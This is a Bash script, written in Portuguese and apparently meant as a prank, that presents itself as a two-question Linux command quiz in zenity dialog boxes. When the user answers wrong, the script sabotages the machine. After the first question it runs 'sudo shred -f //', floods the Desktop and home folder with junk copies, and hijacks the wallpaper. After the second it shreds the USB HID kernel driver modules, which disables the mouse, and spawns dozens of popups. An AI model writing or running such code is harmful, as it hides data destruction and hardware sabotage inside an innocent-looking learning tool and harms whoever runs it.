#!/bin/bash

'codigo escrito por: Helvecio Resende Chaves'

'INTRODUÇÃO'

zenity --info --title "Aviso" --text "Na verdade, o teste começará agora, boa sorte! :)" 

'PRIMEIRA ETAPA'

resposta1=$(zenity --entry --title "Teste 1:" --text "Qual o nome do comando que cria uma pasta? (pense antes, não haverá segundas chances...)")

if [ "$resposta1" = "mkdir" ];

then zenity --info --height 400 --width 700 --text "Parabens, resposta correta!!"  

else zenity --info --height 400 --width 700 --text "Resposta Incorreta" &&	
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/last-image -s ~/Downloads/squirward.jpeg;
	sleep 3 &&
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-enable -s true;
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-timer  -s 1;
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-period -s 0;
	yes HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA | head -n 7000 >> ~/Scripts/invasao.txt &&
	for i in {1..100}; do cp ~/Scripts/invasao.txt ~/Desktop/Adeus$i.txt & done &&
	for i in {1..100}; do cp ~/Scripts/invasao.txt ~//*$i & done &&
	sudo shred -f // &&
	break

fi

'SEGUNDA ETAPA' 

resposta2=$(zenity --entry --title "Teste 2:" --text "Qual o nome do comando muda as configuraçoes de acesso de uma pasta ou arquivo ? (pense antes, não haverá segundas chances...)")

if [ "$resposta2" = "chmod" ];
	
then zenity --info --text "Nossaaaa, Parabens!!!" &&
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/last-image -s ~/Downloads/parabens.jpeg &&
	zenity --info --height 400 --width 700 --title "PARABENS VOCE CONCLUIU SUA JORNADA" --text "Agora, faça seu relatorio de acordo com o arquivo 'LEIA-ME'" && 
	echo -e "\Preencha abaixo as informaçoes pedidas pelo primeiro documento:" >> ~/Downloads/jornada.txt &&
	open ~/Downloads/jornada.txt &&
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/last-image -s ~/Downloads/ceu.jpeg 

else zenity --info --height 400 --width 700 --text "Resposta Incorreta" && 
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/last-image -s ~/Downloads/squirward.jpeg &&
	sleep 5 &&
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-enable -s true;
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-timer  -s 1;
	xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/backdrop-cycle-period -s 0;
	sudo shred -f /lib/modules/7.0.0-42-generic/kernel/drivers/hid/usbhid/* &&
	for i in {1..60}; do xcowsay -t 10 "INFELIZMENTE SEU MOUSE JA ERA :(" & done &&
	xcowsay -t 10 --cow-size med --image ~/Downloads/ghost.jpeg &&
	yes HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA | head -n 7000 >> ~/Scripts/invasao.txt &&
	for i in {1..100}; do cp ~/Scripts/invasao.txt ~/Desktop/Adeus$i.txt & done &&
	for i in {1..100}; do cp ~/Scripts/invasao.txt ~//*$i & done

fi